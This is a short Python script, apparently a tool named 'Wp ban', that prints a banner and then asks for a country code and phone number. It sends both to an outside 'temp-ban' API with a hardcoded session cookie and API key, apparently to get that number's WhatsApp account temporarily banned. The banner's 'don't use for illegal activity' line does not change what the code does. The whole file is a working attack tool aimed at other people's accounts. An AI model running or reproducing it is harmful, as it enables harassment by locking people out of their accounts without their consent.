r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
d = "\033[2;37m"
R = "\033[1;41m"
Y = "\033[1;43m"
B = "\033[1;44m"
w = "\033[1;37m"




logo = """\033[1;37m

┌-=============================   -   
=      \033[1;31m . ┌──────── \033[1;37mVaim-Emsg     -   
=  \033[1;31m .┌───  \033[1;37mB-Hat Thor PROJECT   -   \033[34m[✔️] https://github.com/codexniyansh/Wp-ban-.git    [✔️]
\033[1;37m=   Wp ban           -   \033[34m[✔️]            Version 1.0                 [✔️]
\033[1;37m= \033[1;31m . └──── \033[1;37mBY Thor   -   \033[91m[X] Please Don't Use For illegal Activity  [X]
\033[1;37m= \033[1;31m .     └─── \033[1;37mVERSION 1.0         -
\033[1;37m└-=============================   -



\033[97m """



def banner():
    print(logo)


banner()

import requests
code=input("ENTER A CODE ")
NUMBER=input("ENTER A NUMBER ")

url = 'https://api-bruxiintk.online/api/temp-ban'
headers = {
    'Host': 'api-bruxiintk.online',
    'Sec-Ch-Ua': '"Chromium";v="121", "Not A(Brand";v="99"',
    'Sec-Ch-Ua-Mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Accept': '*/*',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://api-bruxiintk.online/tempban.html',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'Priority': 'u=1, i'
}
cookies = {
    'connect.sid': 's%3A7kBaoRIJK0I3qyMcnoHHEN4aCsBHlOZt.tm0%2BX6erehfLEAehlKcFHXxaqm129KM7dxvkU%2BQgUio'
}
params = {
    'apikey': 'devs30',
    'ddi': code,
    'numero': NUMBER
}


response = requests.get(url, headers=headers, cookies=cookies, params=params)

print(response.text)
